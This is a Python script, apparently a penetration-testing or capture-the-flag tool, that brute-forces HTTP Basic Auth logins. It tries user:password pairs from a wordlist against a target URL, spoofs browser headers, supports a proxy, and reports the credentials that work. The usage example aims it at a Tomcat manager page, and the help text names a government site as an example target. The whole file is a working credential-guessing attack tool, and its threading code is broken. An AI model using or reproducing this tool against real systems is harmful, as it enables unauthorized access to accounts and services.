import os, sys
import requests, requests.auth
import threading

from requests.sessions import default_headers
from functools import lru_cache


__ver__ 	= 0.1
__author__ 	= 0x1a906

__DOC__ ="""
Simple http login bruteforcer using requests.auth method.

EXAMPLE USAGE:

$python3 login_crackr.py \n
	-t	http://10.129.1.110:8080/manager/html \
    -w SecLists/Passwords/Default-Credentials/ALL.txt \
    --sep : --threads 8 --debug False \
    --proxy 127.0.0.1:8080
"""



#	GETTING THE ARGS:
import argparse
parser = argparse.ArgumentParser()

parser.add_argument('-target', '-t',
                required=True,
                type=str,
                help='Target hostname, ie http://nsa.gov:8080/login')

parser.add_argument('-wordlist', '-w',
				required=True,
				type=str,
				help='Wordlist to use at auth.')

parser.add_argument('--separator', '--sep','-s',
				type=str,
				default=' ',
				help='Separator for user and password in wordlist file')

parser.add_argument('--threads', '--cpus',
				type=int,
				default=4,
				help='Threads number to use. Default is 4')

parser.add_argument('--proxy','-p',
				type=str,
				help='Proxy to use, ie 127.0.0.1:8080')

parser.add_argument('--method', '-m',
				choices=['GET', 'POST'],
				default='GET',
				help='HTTP method to use on auth, default is GET')

parser.add_argument('--no_debug','-n',
				default=True,
				action='store_false',
				help='Set False if you dont want to print all attempts.')

args = parser.parse_args()



#	PARSING THE ARGS:
wordlist	= 		args.wordlist
target 		= 		args.target
meth		=		args.method
_SEP_		=		args.separator
_THREADS_	=		args.threads
debug       	=       args.no_debug

proxyDict = {}
if args.proxy:
    https_proxy = 'https://'+args.proxy
    http_proxy 	= 'http://'+args.proxy
    ftp_proxy 	= 'ftp://'+args.proxy
    proxyDict 	= {
		'https'	: https_proxy,
  		'http'	: http_proxy,
		'ftp'	: ftp_proxy,
	}


data_static = {
	"User-Agent": """Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
     	AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36""",
	
 	"Accept": """text/html,application/xhtml+xml,application/xml;q=0.9,\
		image/avif,image/webp,\
    		image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9""",
	
 	"Accept-Encoding": "gzip, deflate",
	"Accept-Language": "en-US,en;q=0.9",
}

print('[INFO] : Using static data vars:')
print('\n', data_static,'\n')



#	SPECIFYING THE CORE FUNC:
@lru_cache(maxsize=None)
def crack(target:str, wordlist:str, method:str,  debug:bool=True):
	"""[summary]

	Args:
		target (str): [http://target.ip]
		wordlist (str): [filename.txt]
		method (str): [GET or POST]
		debug (bool, optional): [Prints things]. Defaults to True.
	"""
 
	with open(wordlist, 'r', encoding='utf8') as _file:
		
		#print(_file.__sizeof__()) # Debug line. Won't work in python < 3.8.
		file = _file.readlines()
		num = 0
		clrchar = ' '*15
  
		for c in file:
			
			try:
				num += 1
				creds = {}

				c = tuple(x.strip() for x in c.split(_SEP_) if x)
				if len(c) <= 1: continue

				creds['user'] = c[0]
				creds['pass'] = c[1]
				user, pswd = creds['user'], creds['pass']

				if method == 'POST':
					http_m = requests.Session().post
				else:
					http_m = requests.Session().get

				res = http_m(target, 
					auth = requests.auth.HTTPBasicAuth(user, pswd),
					headers=data_static,
     				proxies=proxyDict)

				if debug and res.status_code == 401 : 
					print("\rWrong creds :", num, user,":",pswd, clrchar, flush=False, end='')
				
				if res.status_code == 200 : 
					print('\nAccess granted.', user,":",pswd)
					sys.exit(0)
			
			except UnicodeEncodeError as e: # Deal with weird shite pls.
				if debug : print('[INFO] Decode error on '+pswd+":"+user)	



#	EXECUTION:
threads = []
if __name__ == "__main__":
	for _ in range(_THREADS_):
		t = threading.Thread(target=crack(target, wordlist, meth, debug))
		t.start()
		threads.append(t)

	for thread in threads:
		thread.join()
